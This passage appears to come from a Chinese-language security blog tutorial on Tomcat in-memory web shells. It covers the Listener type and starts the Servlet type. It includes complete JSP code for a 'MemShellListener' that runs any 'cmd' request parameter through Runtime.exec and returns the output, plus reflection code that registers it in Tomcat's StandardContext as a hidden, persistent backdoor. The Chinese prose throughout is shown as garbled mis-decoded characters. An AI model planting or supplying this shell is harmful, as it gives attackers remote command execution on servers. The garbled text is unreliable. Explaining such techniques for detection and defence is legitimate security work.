</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">instances</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">instances</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ServletRequestEvent</span> <span class="n">event</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServletRequestEvent</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">(),</span> <span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">instances</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="k">instanceof</span> <span class="n">ServletRequestListener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletRequestListener</span> <span class="n">listener</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestListener</span><span class="o">)</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listener</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">event</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">handleThrowable</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">this</span><span class="o">.</span><span class="na">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardContext.requestListener.requestInit&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">instances</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()}),</span> <span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">&#34;javax.servlet.error.exception&#34;</span><span class="o">,</span> <span class="n">var7</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æœ€åæˆ‘ä»¬è‡ªå®šä¹‰çš„Listenerç±»ä¸­çš„ <code>requestInitialized()</code> å°±å¾—ä»¥å®ç°äº†ã€‚ <!-- raw HTML omitted --></p>
<h3 id="æ„é€ listenerå†…å­˜é©¬">æ„é€ Listenerå†…å­˜é©¬</h3>
<p>é€šè¿‡ä¸Šé¢çš„Listenerè¢«è°ƒç”¨æƒ…å†µï¼Œæˆ‘ä»¬çŸ¥é“å¯¹äºæ¯ä¸€ä¸ªæ–°çš„è¯·æ±‚ï¼ŒTomcatéƒ½ä¼šè§¦å‘ <code>fireRequestInitEvent()</code> äº‹ä»¶ï¼Œè¿›è€Œé€šè¿‡ <code>StandardContext#getApplicationEventListeners()</code> æ‰¾å‡ºæ³¨å†Œåœ¨StandardContextå®ä¾‹ä¸­çš„ <code>ServletRequestListener()</code>, æœ€ç»ˆè°ƒç”¨å…¶ä¸­å®šä¹‰çš„ <code>requestInitialized()</code> æ–¹æ³•ã€‚ <!-- raw HTML omitted --></p>
<p>æ ¹æ®è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦åœ¨Tomcatå¯åŠ¨ä¹‹åæ³¨å†Œè‡ªå®šä¹‰çš„Listenerç±»ï¼Œä½¿å…¶ä¸­åŒ…å«çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼Œåªéœ€è¦å°†è‡ªå®šä¹‰çš„Listenerçš„å®ä¾‹æ·»åŠ åˆ°StandardContextä¸­çš„æˆå‘˜å˜é‡ <code>applicationEventListenersList</code> ä¸­å°±å¯ä»¥äº†ã€‚ <!-- raw HTML omitted --></p>
<ol>
<li>
<p>æ„å»ºä¸€ä¸ªListenerå®ç°ServletRequestListeneræ¥å£ï¼Œå¹¶ä¸”é‡å†™ <code>requestInitialized</code> æ–¹æ³•ï¼Œå®ç°æ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellListener</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">sre</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServletRequestListener</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">requestInitialized</span><span class="o">(</span><span class="n">sre</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">RequestFacade</span> <span class="n">requestFacade</span> <span class="o">=</span> <span class="o">(</span><span class="n">RequestFacade</span><span class="o">)</span> <span class="n">sre</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">requestFacadeField</span> <span class="o">=</span> <span class="n">requestFacade</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">requestFacadeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestFacadeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">requestFacade</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">requestFacade</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>è·å–StandardContextå®ä¾‹ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>è¿™é‡ŒåŒºåˆ«äºæˆ‘ä»¬åœ¨StandardFilterä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œæ˜¯ä¸€ç§æ–°çš„æ€è·¯ï¼› <!-- raw HTML omitted --></li>
<li>å…¶å®æˆ‘ä»¬åœ¨JSPä¸­è·å¾—çš„requestéƒ½æ˜¯ <strong>RequestFacade</strong> é—¨é¢ç±»çš„å®ä¾‹ï¼Œä»ä¸­æ‹¿åˆ°Requestçš„å®ä¾‹ä¹‹åå°±å¯ä»¥ç›´æ¥æ‹¿åˆ°StandardContextçš„å®ä¾‹ï¼› <!-- raw HTML omitted --></li>
<li>å°±ä¸ç”¨å†åƒä¹‹å‰ä¹Ÿä¸€æ ·å¥—é‚£ä¹ˆå¤šå±‚äº†ï¼› <!-- raw HTML omitted --></li>
</ul>
</li>
<li>
<p>è°ƒç”¨StandardContext#addApplicationListener()æ–¹æ³•å°†è‡ªå®šä¹‰çš„Listenerç±»æ³¨å†Œåˆ°StandardContextçš„å®ä¾‹ä¸­ï¼› <!-- raw HTML omitted --></p>
<ul>
<li>é‚£ä¹ˆä¹‹åTomcatåœ¨æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œå°±ä¼šæŒ‰ç…§æˆ‘ä»¬ä¸Šé¢ä»‹ç»çš„è°ƒç”¨é“¾ä» applicationListeners ä¸­ç­›é€‰å‡ºæ‰€æœ‰çš„ <strong>ServletRequestListener</strong>, å¹¶æ‰§è¡Œ <code>requestInitialized()</code> æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„æ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">MemShellListener</span> <span class="n">memShellListener</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellListener</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">memShellListener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>å¯åŠ¨Tomcatï¼Œæ‰§è¡ŒMemShellListener.jspæ³¨å†Œæˆ‘ä»¬çš„Filterï¼› <!-- raw HTML omitted --></p>
</li>
<li>
<p>æ¥ç€å¸¦ç€ <code>cmd</code> å‚æ•°å‘å‡ºè¯·æ±‚ï¼ŒListenerå†…å­˜é©¬è¢«è°ƒç”¨ï¼Œæ‰§è¡Œä»£ç æˆåŠŸï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_12-06-03_screenshot.png"
             alt="Figure 6: Listenerå†…å­˜é©¬æ‰§è¡ŒæˆåŠŸ" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 6: <!-- raw HTML omitted -->Listenerå†…å­˜é©¬æ‰§è¡ŒæˆåŠŸ</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
</li>
</ol>
<p>æœ€åè¡¥å……ä¸€ä¸ªè§åˆ°çš„å†…å­˜é©¬ä¸­â€œæ— ä¸­ç”Ÿæœ‰â€è·å–StandardContextå®ä¾‹çš„æ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="n">WebappClassLoaderBase</span> <span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebappClassLoaderBase</span><span class="o">)</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="na">getResources</span><span class="o">().</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><h2 id="servletå‹">Servletå‹</h2>
<p>Servletåº”è¯¥æ˜¯è¿™ä¸‰ä¸ªç»„ä»¶é‡Œå¤§å®¶æœ€ç†Ÿæ‚‰çš„ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯TomcatæœåŠ¡å™¨çœŸæ­£ç”¨æ¥æä¾›æœåŠ¡ï¼Œå¤„ç†ä¸šåŠ¡çš„ç»„ä»¶ã€‚ <!-- raw HTML omitted --></p>
<p>è€è§„çŸ©æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªæ™®é€šçš„Servletæ˜¯å¦‚ä½•å¼€å‘ï¼Œæ¥ç€è¢«åŠ è½½æ³¨å†Œï¼Œä»¥åŠæœ€åè¢«è°ƒç”¨çš„ã€‚ <!-- raw HTML omitted --></p>
<h3 id="å¼€å‘è‡ªå®šä¹‰servlet">å¼€å‘è‡ªå®šä¹‰Servlet</h3>
<h4 id="å¼€å‘servletç±»">å¼€å‘Servletç±»</h4>
<p>æˆ‘ä»¬è¿™é‡Œä¸ºäº†è®©Serveltç®€å•ä¸€ç‚¹ï¼Œå°±ç›´æ¥ç»§æ‰¿Servletæ¥å£ï¼Œè€Œä¸å»ç»§æ‰¿HTTPServletäº†ï¼Œå› æ­¤ä¹Ÿå°±éœ€è¦é‡å†™ä¸€ä¸‹ <code>service()</code> æ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<p>æ¥ç€æˆ‘ä»¬è¦å» <code>web.xml</code> ä¸­å°†åˆšå†™å¥½çš„Servletæ³¨å†Œåˆ°é…ç½®ä¸­ï¼ŒåŒæ—¶é…ç½®å¥½å¯¹åº”çš„è®¿é—®è·¯å¾„ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-name&gt;</span>TmpServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-class&gt;</span>com.example.tomcatmemshell.TmpServlet<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;servlet-name&gt;</span>TmpServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&lt;url-pattern&gt;</span>/tmpServlet<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span></code></pre></div><h4 id="tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½servletç±»">Tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½Servletç±»</h4>
<p>è¿™æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸‰ä¸ªç»„ä»¶äº†ï¼Œæ­¥éª¤ç›¸ä¿¡å¤§å®¶éƒ½å·²ç»éå¸¸ç†Ÿæ‚‰äº†ï¼ŒTomcatä¼šä» <code>web.xml</code> ä¸­è¯»å–éœ€è¦åŠ è½½æ³¨å†Œçš„ <strong>Servlet</strong> ç±»çš„ä¿¡æ¯ï¼š <!-- raw HTML omitted --></p>
<p>ConfigureConfigure#configureContext()ä¸­è¦å±Servletçš„éƒ¨åˆ†æœ€å¤æ‚ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>åˆ›å»ºä¸€ä¸ªWrapperå¯¹è±¡ç”¨æ¥å°è£…Servletï¼› <!-- raw HTML omitted --></li>
<li>è®¾ç½®Wrapperçš„åå­—ï¼Œä¹Ÿå°±æ˜¯Servletçš„åå­— <!-- raw HTML omitted --></li>
<li>è®¾ç½®Wrapperä¸­æ‰€å°è£…çš„Servletçš„ç±»åï¼Œæ–¹ä¾¿åæœŸå®ä¾‹åŒ–ï¼› <!-- raw HTML omitted --></li>
<li>å°†åˆ›å»ºçš„Wrapperå®ä¾‹æ·»åŠ åˆ°StandardContextçš„Hashmap childrenå½“ä¸­å»ï¼› <!-- raw HTML omitted --></li>
<li>åŠ è½½&lt;servlet-mapping&gt;é…ç½®å†…å®¹ï¼Œé…åˆServletæ¥ç”Ÿæ•ˆï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">ServletDef</span> <span class="n">servlet</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getServlets</span><span class="o">().</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 1. åˆ›å»ºä¸€ä¸ªWrapperå¯¹è±¡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">createWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/** é€šè¿‡web.xmlä¸­çš„&lt;load-on-startup&gt;å…ƒç´ åˆ¤æ–­æ˜¯å¦éœ€è¦åœ¨å¯åŠ¨æ—¶åŠ è½½:
</span></span></span><span class="line"><span class="cl"><span class="cm">         * &gt;=0, è¡¨ç¤ºä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼›
</span></span></span><span class="line"><span class="cl"><span class="cm">         * &lt;0, è¡¨ç¤ºåªæœ‰åœ¨è°ƒç”¨æ—¶ï¼Œæ‰ä¸»åŠ¨åŠ è½½è¿™ä¸ªservletï¼›
</span></span></span><span class="line"><span class="cl"><span class="cm">         * è¿™å°±æ˜¯Tomcatçš„æ‡’åŠ è½½æœºåˆ¶
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">setLoadOnStartup</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">().</span><span class="na">intValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// é€šè¿‡web.xmlä¸­çš„&lt;enabled&gt;æ ‡ç­¾æ¥åˆ¤æ–­æ˜¯å¦è¦å¯ç”¨è¯¥Servlet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">().</span><span class="na">booleanValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 2. è®¾ç½®Wrapperçš„åå­—
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">wrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">params</span> <span class="o">=</span> <span class="n">servlet</span><span class="o">.</span><span class="na">getParameterMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//åŠ è½½&lt;init-param&gt;å…ƒç´ ä¸­çš„å†…å®¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">params</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">wrapper</span><span class="o">.</span><span class="na">addInitParameter</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">wrapper</span><span class="o">.</span><span class="na">setRunAs</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getRunAs</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 3. è®¾ç½®Wrapperæ‰€å°è£…çš„çš„Servletçš„ç±»å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">wrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getServletClass</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 4. å°†åˆ›å»ºçš„Wrapperå®ä¾‹æ·»åŠ åˆ°StandardContextçš„Hashmap childrenå½“ä¸­å»ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// protected final HashMap&lt;String, Container&gt; children = new HashMap&lt;&gt;();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 5. åŠ è½½&lt;servlet-mapping&gt;é…ç½®å†…å®¹ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// public void addServletMappingDecoded(String pattern, String name), e.g., pattern=&#34;/myServlet&#34;, name=MyServlet;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">webxml</span><span class="o">.</span><span class="na">getServletMappings</span><span class="o">().</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æ¥ç€ï¼Œå’Œä¹‹å‰ä¸¤ä¸ªç»„ä»¶ä¸€æ ·ï¼ŒTomcatä¼šåœ¨StandardContext#startInternal()ä¸­è°ƒç”¨ <code>loadOnStartup()</code> æ–¹æ³•æ¥æ‡’å¯åŠ¨é‚£äº›è¢«&lt;load-on-startup&gt;æ ‡è®°ä¸ºéœ€è¦åœ¨å¯åŠ¨æ—¶åŠ è½½çš„Servlet: <!-- raw HTML omitted --></p>
<ol>
<li>æ ¹æ®loadOnStartupåˆ¤æ–­è¯¥Wrapperæ˜¯å¦éœ€è¦åœ¨å¯åŠ¨æ—¶è¢«åŠ è½½; <!-- raw HTML omitted --></li>
<li>åˆå§‹åŒ–Wrapperï¼Œæœ€ç»ˆå°†ä¼šè°ƒç”¨servlet.init()æ¥åˆå§‹åŒ–å°è£…çš„Servlet; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">loadOnStartup</span><span class="o">(</span><span class="n">Container</span> <span class="n">children</span><span class="o">[])</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">TreeMap</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">,</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">Container</span> <span class="n">child</span> <span class="o">:</span> <span class="n">children</span><span class="o">)</span> <span class="o">{</span>
